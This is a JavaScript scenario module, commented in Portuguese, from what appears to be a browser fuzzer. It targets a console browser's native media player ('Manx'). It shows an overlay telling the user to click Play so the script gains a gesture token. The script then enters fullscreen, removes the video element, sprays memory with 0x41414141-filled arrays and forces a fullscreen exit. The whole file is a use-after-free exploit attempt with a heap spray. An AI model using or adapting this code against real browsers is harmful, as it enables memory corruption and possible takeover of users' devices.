/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (The Leandro's Sniper Trigger)
 * Alvo: MediaPlayerPrivateManx + User Gesture Token
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE2',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Pausa o fuzzer e cria um vídeo real na tela. ' +
                 'Aguarda o clique do utilizador (Play) para obter o Token de Gesto e ' +
                 'forçar a entrada no Manx Nativo de forma 100% fiável.',

    setup: async function() {
        // 1. Criamos um "Overlay" visual para forçar a interação manual
        this.overlay = document.createElement('div');
        this.overlay.style.cssText = `
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(0, 0, 0, 0.9); z-index: 9999;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        `;
        
        const title = document.createElement('h1');
        title.innerText = "🔥 CLIQUE NO PLAY PARA INJETAR 🔥";
        title.style.color = "#0fa";
        this.overlay.appendChild(title);

        // 2. O vídeo isca que você sugeriu
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.video.controls = true;
        this.video.style.border = '4px solid #0fa';
        this.video.style.width = '600px';
        this.video.style.cursor = 'pointer';
        
        this.overlay.appendChild(this.video);
        document.body.appendChild(this.overlay);

        // O nosso payload de memória (0x41414141)
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        // O GATILHO SNIPER: Retornamos uma Promise que paralisa o fuzzer
        // até que o utilizador clique no vídeo.
        return new Promise((resolve) => {
            
            const unleashExploit = async () => {
                try {
                    // Oculta o overlay visualmente para não atrapalhar
                    this.overlay.style.display = 'none';

                    // 1. O SEGREDO DO 12.00: Chama o reprodutor nativo (Manx)
                    // Com o Token de Gesto garantido pelo clique, isto NUNCA falha.
                    if (this.video.webkitEnterFullscreen) {
                        this.video.webkitEnterFullscreen();
                    } else if (this.video.webkitRequestFullscreen) {
                        this.video.webkitRequestFullscreen();
                    }

                    // 2. A Pausa de Ouro (500ms para alocar a GPU)
                    await new Promise(r => setTimeout(r, 500));

                    // 3. FREE: Puxamos o tapete
                    this.video.remove();

                    // 4. SPRAY: Injetamos o veneno
                    this.spray = [];
                    for (let i = 0; i < 5000; i++) {
                        let arr = new Uint32Array(256);
                        arr.set(this.sprayPayload);
                        this.spray.push(arr);
                    }

                    // 5. USE: Forçamos a saída nativa
                    if (this.video.webkitExitFullscreen) {
                        this.video.webkitExitFullscreen();
                    } else if (document.webkitExitFullscreen) {
                        document.webkitExitFullscreen();
                    }

                    // 6. TEARDOWN: Destruição do ambiente nativo
                    // Criamos um iframe descartável apenas para causar o choque de document.write
                    let trashIframe = document.createElement('iframe');
                    document.body.appendChild(trashIframe);
                    
                    setTimeout(() => {
                        try {
                            trashIframe.contentDocument.write('BOOM');
                            trashIframe.contentDocument.close();
                            trashIframe.remove();
                        } catch(e) {}
                        
                        // Libera o fuzzer para continuar para a fase de Probe
                        resolve(); 
                    }, 100);

                } catch(e) {
                    resolve(); // Libera em caso de erro
                }
            };

            // Escuta o evento de 'play' (quando clica no vídeo)
            this.video.addEventListener('play', (e) => {
                e.preventDefault();
                unleashExploit();
            }, { once: true });
        });
    },

    probe: [
        s => s.video.readyState,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.overlay.remove(); } catch(e) {}
        this.spray = null;
        this.video = null;
    }
};
